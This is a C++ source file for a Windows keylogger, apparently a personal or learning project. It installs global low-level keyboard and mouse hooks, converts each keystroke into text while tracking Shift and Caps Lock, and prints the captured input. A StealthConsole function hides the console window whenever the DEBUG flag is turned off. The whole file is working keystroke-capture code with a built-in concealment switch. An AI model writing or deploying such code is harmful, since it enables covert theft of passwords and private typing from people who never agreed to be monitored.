//C++ Headers
#include <windows.h>
#include <winuser.h>

#define DEBUG 1

//Debug Headers
#ifdef DEBUG
    #include <iostream>
#endif

//Global variables
HHOOK mousehook;
HHOOK keyboardhook;
KBDLLHOOKSTRUCT kbd_struct;
MSLLHOOKSTRUCT mouse_struct;

//Callback functions
LRESULT WINAPI HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);


void StealthConsole();
void SetMouseHook();
void SetKeyboardHook();
void SetHooks();
void ReleaseMouseHook();
void ReleaseKeyboardHook();
void ReleaseHooks();
bool IfPrintable(char* str);


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    MSG msg;

    SetHooks();
    StealthConsole();

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

LRESULT CALLBACK HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {

        mouse_struct = *((MSLLHOOKSTRUCT*)lParam);

        switch (wParam) {
            case WM_LBUTTONDOWN:
            // std::cout << "Left mouse click\n";
            break;

            case WM_LBUTTONUP:
            // std::cout << "Left mouse unclick\n";
            break;
        }
    }

    return CallNextHookEx(mousehook, nCode, wParam, lParam);
}

LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        static bool capslock = false;
        static bool shift = false;
        kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
        char str[0xFF] = {0};
        DWORD msg = 1;
        bool printable;

        //Bits position from docs
        msg += (kbd_struct.scanCode << 16);
        msg += (kbd_struct.flags << 24);
        GetKeyNameText(msg, str, 0xFF);        

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // std::cout << "\nDEBUG: " << str << "\n Caps: " << capslock << "\n Shift: " << shift << "\n";
            printable = IfPrintable(str);

            if (!printable) {
                if (strcmp(str, "Caps Lock") == 0) {
                    capslock = !capslock;
                }
                else if (strcmp(str, "Shift") == 0) {   // RIGHT SHIFT NOT WORKING
                    shift = true;
                }

                if (strcmp(str, "Enter") == 0) {
                    strncpy(str, "\n", 0xFF);
                    printable = true;
                }
                else if (strcmp(str, "Space") == 0) {
                    strncpy(str, " ", 0xFF);
                    printable = true;
                }
                else if (strcmp(str, "Tab") == 0) {
                    strncpy(str, "\t", 0xFF);
                    printable = true;
                }
                else {
                    char tmp[0xFF] = {0};
                    snprintf(tmp, 0xFF, "[%s]", str);
                    strncpy(str, tmp, 0xFF);
                }
            }

            if (printable) {
                if (shift == capslock) {
                    for (int i = 0; i < strlen(str); ++i) {
                        str[i] = tolower(str[i]);
                    }
                }
                else {
                    for (int i = 0; i < strlen(str); ++i) {
                        str[i] = toupper(str[i]);
                    }
                }
            }

            std::cout << str;
            // char c = MapVirtualKey(kbd_struct.vkCode, 2);
        }
        else if(wParam == WM_KEYUP) {
            if (strcmp(str, "Shift") == 0) {
                shift = false;
            }
        }
    }

    return CallNextHookEx(keyboardhook, nCode, wParam, lParam);
}

void StealthConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    
#ifdef DEBUG
    ShowWindow(stealth, SW_SHOWNORMAL); 
#else
    ShowWindow(stealth, SW_HIDE); 
#endif
}

void SetMouseHook() {
    if (!(mousehook = SetWindowsHookEx(WH_MOUSE_LL, HookMouseCallback, NULL, 0))) {
        std::cout << "Failed to install mouse hook!\n";
    }
}

void SetKeyboardHook() {
    if (!(keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, NULL, 0))) {
        std::cout << "Failed to install keyboard hook!\n";
    }
}

void SetHooks() {
    SetMouseHook();
    SetKeyboardHook();
}

void ReleaseMouseHook() {
    UnhookWindowsHookEx(mousehook);
}

void ReleaseKeyboardHook() {
    UnhookWindowsHookEx(keyboardhook);
}

void ReleaseHooks() {
    ReleaseMouseHook();
    ReleaseKeyboardHook();
}

bool IfPrintable(char* str) {
    return ((strlen(str) <= 1) ? true : false);
}